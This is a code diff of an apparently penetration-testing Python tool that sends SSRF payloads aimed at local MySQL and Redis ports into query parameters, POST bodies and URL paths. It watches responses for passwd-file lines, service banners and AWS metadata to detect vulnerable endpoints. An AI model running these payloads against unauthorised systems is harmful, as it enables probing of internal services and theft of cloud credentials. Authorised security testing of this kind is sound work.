@@ -1,13 +1,16 @@
+#!/usr/bin/env python3
 import json
 import logging
 import asyncio
 import httpx
 import re
-from urllib.parse import urlparse, urljoin, urlencode, parse_qs
+from urllib.parse import urlparse, urljoin, parse_qs
 from tabulate import tabulate
 from colorama import init, Fore
+import signal
+import sys
 
-# Initialize colorama for colored output
+# Initialize colorama
 init(autoreset=True)
 
 # Configuration
@@ -35,152 +38,148 @@ SSRF_PAYLOADS = [
     'http://127.0.0.1:3306',
     'dict://127.0.0.1:6379/info'
 ]
+DEFAULT_TIMEOUT = 50
+SEMAPHORE_LIMIT = 5  # concurrency limit
 
-pattern = re.compile(
-    r'[a-zA-Z_-]{1,}:x:[0-9]{1,}:[0-9]{1,}:'  # passwd file pattern
-    r'|<html>(<head></head>)?<body>[a-z0-9]+</body>'  # Basic HTML pattern for collaborator
-    r'|SSH-(\d\.\d)-OpenSSH_(\d\.\d)'  # SSH version pattern
-    r'|(DENIED Redis|CONFIG REWRITE|NOAUTH Authentication)'  # Redis errors
-    r'|(\d\.\d\.\d)(.*?)mysql_native_password'  # MySQL version pattern
-    r'|for 16-bit app support'   #Windows legacy support
-    r'|dns-conf\/[\s\S]+instance\/'  # DNS config
-    r'|app-id[\s\S]+placement\/'  # AWS App-ID
-    r'|ami-id[\s\S]+placement\/'  # AWS AMI-ID
-    r'|id[\s\S]+interfaces\/'  # AWS Network Interfaces
-)
-DEFAULT_TIMEOUT = 1
+# Global to hold last results so SIGINT can save something useful
+last_results = []
 
-# Concurrency limit for async tasks
-SEMAPHORE_LIMIT = 10  # You can adjust this value based on your system's capacity
+
+def clean_headers(headers):
+    """
+    Return a copy of headers with Content-Length and Transfer-Encoding removed (case-insensitive).
+    """
+    if not headers:
+        return {}
+    return {k: v for k, v in headers.items() if k.lower() not in ("content-length", "transfer-encoding")}
+
 
 async def inject_SSRF_payload(session, request, semaphore):
     """
-    Inject SSRF payloads into the request and test for vulnerabilities, including path-based SSRF.
-    
-    Args:
-        session: The HTTPX session.
-        request: A dictionary containing request details from requests.json.
-        semaphore: A semaphore for limiting concurrent requests.
-    
-    Returns:
-        List of dictionaries containing results for each tested payload.
+    Inject SSRF payloads into GET params, POST bodies, and paths while avoiding Content-Length mismatches.
     """
     results = []
     url = request["url"]
     method = request.get("method", "GET").upper()
-    headers = request.get("headers", {}).copy()
+    # copy input headers so we don't mutate original dict
+    headers_in = request.get("headers", {}) or {}
+    headers = headers_in.copy()
     body = request.get("body")
     parsed_url = urlparse(url)
     query_params = parse_qs(parsed_url.query)
 
-    # Semaphore to limit concurrency
     async with semaphore:
-        # Test GET requests with query parameters
+        # --- 1. GET requests with query parameters ---
         if method == "GET" and query_params:
             for param, values in query_params.items():
                 for payload in SSRF_PAYLOADS:
                     modified_params = query_params.copy()
-                    modified_params[param] = [payload for value in values]
+                    modified_params[param] = [payload for _ in values]
                     new_query_string = "&".join(
-                        f"{param}={value}" for param, values in modified_params.items() for value in values
+                        f"{p}={v}" for p, vals in modified_params.items() for v in vals
                     )
-                    new_url = urljoin(url, f"{parsed_url.path}?{new_query_string}")
+                    # Build new URL preserving scheme/netloc and path
+                    new_url = parsed_url._replace(query=new_query_string).geturl()
 
-                    result = await test_SSRF(session, new_url, method, headers=headers)
+                    # Let test_SSRF clean headers centrally; pass a copy
+                    result = await test_SSRF(session, new_url, method, headers=headers.copy())
                     if result and result["SSRF_detected"]:
-                        result["query_params"] = query_params  # Original query parameters
-                        result["modified_query_params"] = modified_params  # Modified query parameters
-                        result["payload"] = payload  # The payload used
+                        result["query_params"] = query_params
+                        result["modified_query_params"] = modified_params
+                        result["payload"] = payload
                         results.append(result)
-                        break  # Break after detecting SSRF and move to the next request
+                        break
 
-        # Test POST requests with payloads
-        elif method == "POST" and body:
+        # --- 2. POST requests with body payloads ---
+        elif method == "POST" and body is not None:
             for payload in SSRF_PAYLOADS:
+                # Prepare payloaded body but do NOT set Content-Length header
+                # We'll pass either data (bytes/str) or json (dict) to httpx and let it handle length
                 if isinstance(body, str):
                     modified_body = body + payload
-                    logging.debug(f"Modified body size (str): {len(modified_body)}")
-                    headers.pop("Content-Length", None)
-                    headers["Transfer-Encoding"] = "chunked"  # Add chunked encoding
+                    data_to_send = modified_body  # str ok, httpx will encode
+                    json_to_send = None
                 elif isinstance(body, dict):
-                    modified_body = {key: payload for key, value in body.items()}
-                    body_str = json.dumps(modified_body)
-                    logging.debug(f"Modified body size (dict): {len(body_str)}")
-                    headers.pop("Content-Length", None)
-#                    headers.pop("Transfer-Encoding", None)
-                    headers["Transfer-Encoding"] = "chunked"
+                    # Use json parameter to allow httpx to correctly set content-length and content-type
+                    modified_dict = {k: (v + payload if isinstance(v, str) else v) for k, v in body.items()}
+                    data_to_send = None
+                    json_to_send = modified_dict
                 else:
-                    modified_body = body
+                    # fallback: stringify and append
+                    modified_body = str(body) + payload
+                    data_to_send = modified_body
+                    json_to_send = None
 
-                # Log body size before sending request
-                logging.debug(f"Sending request with body size: {len(modified_body)}")
-
-                # Send the request with the modified body
+                # Pass copies of headers -- test_SSRF will clean them
                 try:
-                    result = await test_SSRF(session, url, method, headers=headers, data=modified_body)
+                    result = await test_SSRF(session, url, method, headers=headers.copy(), data=data_to_send, json_data=json_to_send)
                     if result and result["SSRF_detected"]:
-                        result["post_data"] = body  # Original POST data
-                        result["modified_post_data"] = modified_body  # Modified POST data with payload
-                        result["payload"] = payload  # The payload used
+                        result["post_data"] = body
+                        result["modified_post_data"] = (json_to_send if json_to_send is not None else data_to_send)
+                        result["payload"] = payload
                         results.append(result)
-                        break  # Break after detecting SSRF and move to the next request
+                        break
                 except Exception as e:
-                    logging.error(f"Error while testing SSRF payload: {e}")
+                    logging.error(f"Error while testing SSRF payload (POST) on {url}: {e}")
                     continue
 
-        # Path-Based SSRF Detection (only modify path)
-        if method == "GET" or method == "POST":
-            path_parts = parsed_url.path.split('/')
-
-            # Look for path segments that could be vulnerable
+        # --- 3. Path-based SSRF injection ---
+        if method in ("GET", "POST"):
+            # split path and preserve empty root handling
+            path = parsed_url.path or "/"
+            stripped = path.strip("/")
+            path_parts = stripped.split("/") if stripped != "" else []
+            # if there are no parts (root), we can still try injecting after root by adding parts
+            indices = range(len(path_parts))
             for i, part in enumerate(path_parts):
-                if part:  # Only modify non-empty path segments
-                    for payload in SSRF_PAYLOADS:
-                        path_parts[i] = payload
-                        modified_path = '/'.join(path_parts[:i] + [payload])
-                        new_url = urlparse(url)._replace(path=modified_path).geturl()
+                if part == "":
+                    continue
+                for payload in SSRF_PAYLOADS:
+                    modified_parts = path_parts.copy()
+                    modified_parts[i] = part + payload
+                    modified_path = "/" + "/".join(modified_parts)
+                    new_url = parsed_url._replace(path=modified_path).geturl()
 
-                        # Send the request with the modified path
-                        try:
-                            result = await test_SSRF(session, new_url, method, headers=headers)
-                            if result and result["SSRF_detected"]:
-                                result["path"] = parsed_url.path  # Original path
-                                result["modified_path"] = modified_path  # Modified path with payload
-                                result["payload"] = payload  # The payload used
-                                results.append(result)
-                                break  # Break after detecting SSRF and move to the next request
-                        except Exception as e:
-                            logging.error(f"Error while testing path-based SSRF payload: {e}")
-                        path_parts[i] = part  # Reset path segment after testing
-
+                    try:
+                        result = await test_SSRF(session, new_url, method, headers=headers.copy())
+                        if result and result["SSRF_detected"]:
+                            result["path"] = parsed_url.path
+                            result["modified_path"] = modified_path
+                            result["payload"] = payload
+                            results.append(result)
+                            break
+                    except Exception as e:
+                        logging.error(f"Error while testing path-based SSRF payload on {new_url}: {e}")
     return results
 
-async def test_SSRF(session, url, method, headers=None, data=None):
+
+async def test_SSRF(session, url, method, headers=None, data=None, json_data=None):
     """
-    Send an HTTP request and test for SSRF vulnerabilities.
-    
-    Args:
-        session: The HTTPX session.
-        url: The request URL.
-        method: The HTTP method.
-        headers: Optional headers for the request.
-        data: Optional data for POST requests.
-    
-    Returns:
-        A dictionary with the test results or None if no SSRF is detected.
+    Centralized request sender. Cleans headers (removes Content-Length/Transfer-Encoding)
+    and uses httpx to send data/json so it calculates Content-Length correctly.
     """
     try:
-        response = await session.request(method, url, headers=headers, data=data, timeout=DEFAULT_TIMEOUT)
+        # Clean headers case-insensitively
+        cleaned_headers = clean_headers(headers or {})
+        if logging.getLogger().isEnabledFor(logging.DEBUG):
+            present = ", ".join(k for k in (headers or {}).keys())
+            cleaned = ", ".join(k for k in cleaned_headers.keys())
+            logging.debug(f"Request -> {method} {url}")
+            logging.debug(f"Original headers present: {present}")
+            logging.debug(f"Cleaned headers sent: {cleaned}")
 
-        for payload in SSRF_PAYLOADS:
-            if pattern.search(response.text):  # Check for ssrf
-                return {
-                    "url": url,
-                    "method": method,
-                    "status_code": response.status_code,
-                    "SSRF_detected": True,
-                    "payload": payload
-                }
+        # Use httpx to send either data (str/bytes) or json (dict)
+        response = await session.request(method, url, headers=cleaned_headers, data=data, json=json_data, timeout=DEFAULT_TIMEOUT)
+
+        # Look for /etc/passwd-like entries
+        if re.search(r'[a-zA-Z0-9_\-]+:x:[0-9]+:[0-9]+:|<html>(<head></head>)?<body>[a-z0-9]+</body>|SSH-(\d\.\d)-OpenSSH_(\d\.\d)|(DENIED Redis|CONFIG REWRITE|NOAUTH Authentication)|(\d\.\d\.\d)(.*?)mysql_native_password|for 16-bit app support|dns-conf\/[\s\S]+instance\/|app-id[\s\S]+placement\/|ami-id[\s\S]+placement\/|id[\s\S]+interfaces\/', response.text):
+            return {
+                "url": url,
+                "method": method,
+                "status_code": response.status_code,
+                "SSRF_detected": True,
+                "response_excerpt": response.text[:1000]  # small excerpt for debugging
+            }
         return {
             "url": url,
             "method": method,
@@ -188,7 +187,7 @@ async def test_SSRF(session, url, method, headers=None, data=None):
             "SSRF_detected": False
         }
     except httpx.RequestError as e:
-        logging.error(f"Error testing {url} with payload: {data}. Exception: {e}")
+        logging.error(f"HTTP error testing {url}: {e}")
         return {
             "url": url,
             "method": method,
@@ -206,64 +205,47 @@ async def test_SSRF(session, url, method, headers=None, data=None):
             "error": str(e)
         }
 
+
 async def process_requests(requests):
     """
-    Process all requests from requests.json and check for SSRF vulnerabilities.
-    
-    Args:
-        requests: A list of request dictionaries.
-    
-    Returns:
-        A list of results from the SSRF tests.
+    Process all requests and check for SSRF vulnerabilities.
     """
-    semaphore = asyncio.Semaphore(SEMAPHORE_LIMIT)  # Limit concurrent tasks
+    semaphore = asyncio.Semaphore(SEMAPHORE_LIMIT)
     async with httpx.AsyncClient() as session:
         tasks = [inject_SSRF_payload(session, request, semaphore) for request in requests]
         results = await asyncio.gather(*tasks)
-        return [item for sublist in results for item in sublist]  # Flatten the results
+        # flatten
+        flattened = [item for sublist in results for item in sublist]
+        return flattened
+
 
 def load_requests(file_path):
-    """
-    Load requests from requests.json.
-    
-    Args:
-        file_path: Path to the JSON file containing request details.
-    
-    Returns:
-        A list of request dictionaries.
-    """
     with open(file_path, 'r') as f:
         return json.load(f)
 
+
 def save_results(results, output_file):
-    """
-    Save results to a JSON file.
-    
-    Args:
-        results: List of results from the SSRF tests.
-        output_file: Path to the output file.
-    """
     with open(output_file, 'w') as f:
         json.dump(results, f, indent=4)
 
+
 def save_output_on_exit(sig, frame):
-    """Function to save output gracefully when interrupted."""
-    logging.info("Saving output before exit...")
-    with open("output.json", "w") as f:
-        json.dump(requests_data, f, indent=4)
-    logging.info("Output saved. Exiting...")
+    """
+    Signal handler to save last_results on exit.
+    """
+    global last_results
+    logging.info("Interrupted — saving last results to output_on_interrupt.json ...")
+    try:
+        with open("output_on_interrupt.json", "w") as f:
+            json.dump(last_results, f, indent=4)
+        logging.info("Saved output_on_interrupt.json")
+    except Exception as e:
+        logging.error(f"Failed to save output on exit: {e}")
     sys.exit(0)
 
-def print_results(results):
-    """
-    Print results in a formatted table.
-    
-    Args:
-        results: List of results from the SSRF tests.
-    """
-    # Filter results to only show detected SSRF vulnerabilities
-    SSRF_results = [result for result in results if result["SSRF_detected"]]
 
+def print_results(results):
+    SSRF_results = [result for result in results if result.get("SSRF_detected")]
     if not SSRF_results:
         print(Fore.YELLOW + "No SSRF vulnerabilities detected.")
         return
@@ -271,55 +253,43 @@ def print_results(results):
     table_data = []
     for result in SSRF_results:
         table_data.append([
-            result["url"],
-            result["method"],
-            result["status_code"],
+            result.get("url"),
+            result.get("method"),
+            result.get("status_code"),
             Fore.RED + "SSRF Detected"
         ])
     headers = ["URL", "Method", "Status Code", "SSRF Detection"]
     print(tabulate(table_data, headers, tablefmt="grid", stralign="center"))
 
+
 async def main(input_file, output_file):
-    """
-    Main function to orchestrate the SSRF detection process.
-    
-    Args:
-        input_file: Path to the input JSON file.
-        output_file: Path to the output JSON file.
-    """
+    global last_results
     requests = load_requests(input_file)
     logging.info(f"Loaded {len(requests)} requests for testing.")
 
     results = await process_requests(requests)
     # Filter results to only include SSRF detections
-    SSRF_results = [result for result in results if result["SSRF_detected"]]
+    SSRF_results = [result for result in results if result.get("SSRF_detected")]
+    last_results = SSRF_results  # keep for SIGINT save
 
     print_results(SSRF_results)
     save_results(SSRF_results, output_file)
-    signal.signal(signal.SIGINT, save_output_on_exit)
+
 
 if __name__ == "__main__":
-    import argparse
-    import sys
-    import signal
-
-    # Define a signal handler to save results on interrupt
-    signal.signal(signal.SIGINT, save_output_on_exit)
-
-    # Command-line argument parsing
-    parser = argparse.ArgumentParser(description="SSRF Detection Tool")
-    parser.add_argument("--input", default="requests.json", help="Input file with requests (default: requests.json)")
-    parser.add_argument("--output", default="results_SSRF.json", help="Output file for results (default: results_SSRF.json)")
+    parser = argparse = __import__("argparse").ArgumentParser(description="SSRF Detection Tool")
+    parser.add_argument("--input", default="requests.json", help="Input file with requests")
+    parser.add_argument("--output", default="SSRF_linux.json", help="Output file for results")
     parser.add_argument("--verbose", action="store_true", help="Enable verbose logging")
     args = parser.parse_args()
 
-    # Logging configuration
+    signal.signal(signal.SIGINT, save_output_on_exit)
+
     logging.basicConfig(
         level=logging.DEBUG if args.verbose else logging.INFO,
         format="%(asctime)s [%(levelname)s] %(message)s",
     )
 
-    # Run the main function in the asyncio event loop
     try:
         asyncio.run(main(args.input, args.output))
     except KeyboardInterrupt:
